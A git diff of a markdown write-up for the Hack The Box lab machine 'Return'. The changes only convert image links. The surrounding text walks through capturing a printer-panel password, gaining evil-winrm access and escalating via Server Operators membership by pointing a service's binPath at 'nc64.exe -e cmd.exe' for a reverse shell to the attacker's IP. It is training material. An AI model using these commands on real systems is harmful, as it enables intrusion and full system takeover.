@@ -258,7 +258,7 @@ Password:
 **_For some reason, I realized after looking up this box, that there is a website on port 80 for a printer admin panel. For some reason, port 80 did not show in any of the enumeration scans even when specifying all ports. REMEMBER TO TRY A BASIC NMAP SCAN WITH NO PARAMETERS OTHER THAN THE TARGET._**
 
 In this case, I was able to establish a reverse shell by abusing the printer's admin panel. by using my Tun0 IP address and then setting up a netcat listener on port 389.:
-![[./_resources/HTB_Return.resources/image.png]]![[./_resources/HTB_Return.resources/image.1.png]]
+![](./_resources/HTB_Return.resources/image.png)![](./_resources/HTB_Return.resources/image.1.png)
 This revealed the password for the printer:
 
 ```
@@ -267,24 +267,24 @@ Passwd: 1edFg43012!!
 ```
 
 This allowed me to then get a winrm session with evil-winrm.:
-![[./_resources/HTB_Return.resources/image.2.png]]
+![](./_resources/HTB_Return.resources/image.2.png)
 
 User.txt hash:
-![[./_resources/HTB_Return.resources/image.3.png]]
+![](./_resources/HTB_Return.resources/image.3.png)
 Next, I went up to the root directory and created a tmp folder. Then I uploaded Winpeasx64 to it. I was not able to execute it with powershell for some reason so I used the following command:
 ```
 cmd.exe /c 'winPEASx64.exe'
 ```
 
 I did not find anything out of the ordinary except for the fact that there are multiple groups this current user (svc-printer) is a part of.:
-![[./_resources/HTB_Return.resources/image.4.png]]
+![](./_resources/HTB_Return.resources/image.4.png)
 in particular, the **Server Operators** group. When researching this, there is a clear path to escalate privileges. In particular, the article linked here that I found.:
 
 **Server Operators group information:**
 The Server Operator group is a special user group that often has access to powerful commands and settings on a computer system. This group is typically used for managing a server or for troubleshooting system problems. Server Operators are usually responsible for monitoring the server’s performance, managing system security, and providing technical support to users. They may also oversee installing software updates, creating and maintaining user accounts, and performing routine maintenance tasks.
 
 Next, I used the services command to ernumerate the services running.:
-![[./_resources/HTB_Return.resources/image.5.png]]
+![](./_resources/HTB_Return.resources/image.5.png)
 From there, I would transfer the nc64.exe binary to the tmp folder and change the binary path of the service. The reason we are changing the binary path is to receive a reverse connection as system user from the compromised hosts. I used the following command to change the path of the binary.:
 ```
 sc.exe config VMTools binPath="C:\tmp\nc64.exe -e cmd.exe 10.10.16.4 4444"
@@ -299,9 +299,9 @@ finally:
 *Evil-WinRM* PS C:\tmp> sc.exe start VMTools
 ```
 
-![[./_resources/HTB_Return.resources/image.6.png]]
+![](./_resources/HTB_Return.resources/image.6.png)
 
 root.txt:
-![[./_resources/HTB_Return.resources/image.7.png]]
+![](./_resources/HTB_Return.resources/image.7.png)
 
 **###ROOTED!!!###**
